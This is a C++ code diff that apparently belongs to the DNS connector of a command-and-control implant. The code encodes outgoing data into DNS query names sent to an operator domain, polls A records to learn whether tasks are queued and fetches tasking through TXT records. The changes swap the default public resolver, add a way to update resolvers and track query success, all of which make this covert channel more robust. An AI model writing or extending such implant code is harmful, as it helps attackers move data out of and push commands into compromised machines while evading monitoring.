@@ -96,7 +96,7 @@ static int EncodeDnsName(const CHAR* host, BYTE* buf, int bufSize)
 static void SelectResolver(const CHAR* raw, CHAR* out, size_t outSize)
 {
 	// Default to a public recursive resolver if nothing supplied.
-	const CHAR* def = "8.8.8.8";
+	const CHAR* def = "1.1.1.1";
 	if (!raw || !raw[0]) {
 		_snprintf(out, outSize, "%s", def);
 		return;
@@ -134,7 +134,7 @@ static BOOL DnsQueryTxt(const CHAR* qname, const CHAR* resolverRaw, const CHAR* 
 	}
 
 	// 解析 resolver，支持从 profile.resolvers 传入的 IPv4 文本，
-	// 若为空则回退到默认 8.8.8.8。
+	// 若为空则回退到默认 1.1.1.1。
 	CHAR resolver[64];
 	memset(resolver, 0, sizeof(resolver));
 	SelectResolver(resolverRaw, resolver, sizeof(resolver));
@@ -487,6 +487,11 @@ void ConnectorDNS::CloseConnector()
     }
 }
 
+void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
+{
+	this->profile.resolvers = resolvers;
+}
+
 void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
 {
     // base packet size used for DNS frames
@@ -527,10 +532,13 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         BuildQName(this->sid, "www", this->seq, this->idx, dataLabel, this->domain, qname, sizeof(qname));
         BYTE tmp[512];
         ULONG tmpSize = 0;
-        if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
+        this->lastQueryOk = DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize);
+        if (this->lastQueryOk) {
             this->hiSent = TRUE;
-        } else if (this->hiRetries > 0) {
-            this->hiRetries--;
+        } else {
+            if (this->hiRetries > 0) {
+                this->hiRetries--;
+            }
         }
         return;
     }
@@ -629,7 +637,9 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         ULONG tmpSize = 0;
         if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, tmp, sizeof(tmp), &tmpSize)) {
             this->hiSent = TRUE;
+            this->lastQueryOk = TRUE;
         } else {
+            this->lastQueryOk = FALSE;
             if (this->hiRetries > 0)
                 this->hiRetries--;
         }
@@ -650,6 +660,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
         ULONG ipSize = 0;
         // 查询 A 记录
         if (DnsQueryTxt(qnameA, (CHAR*)this->profile.resolvers, "A", ipBuf, sizeof(ipBuf), &ipSize) && ipSize >= 4) {
+            this->lastQueryOk = TRUE;
             // 检查是否为 0.0.0.0
             if (ipBuf[0] == 0 && ipBuf[1] == 0 && ipBuf[2] == 0 && ipBuf[3] == 0) {
                 // 无任务，更新 seq 并返回，让 MainAgent 继续 sleep
@@ -659,6 +670,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
             // 有任务 (e.g. 0.0.0.1)，Fall through to TXT logic below
         } else {
             // A 记录查询失败（可能是丢包或被拦截），稳妥起见，本次跳过 TXT 查询，等待下次重试
+            this->lastQueryOk = FALSE;
             return;
         }
     }
@@ -669,6 +681,7 @@ void ConnectorDNS::SendData(BYTE* data, ULONG data_size)
     BYTE respBuf[1024];
     ULONG respSize = 0;
     if (DnsQueryTxt(qname, (CHAR*)this->profile.resolvers, this->qtype, respBuf, sizeof(respBuf), &respSize) && respSize > 0) {
+        this->lastQueryOk = TRUE;
         // Check for simple ACK "OK"
         if (respSize == 2 && respBuf[0] == 'O' && respBuf[1] == 'K') {
             return;
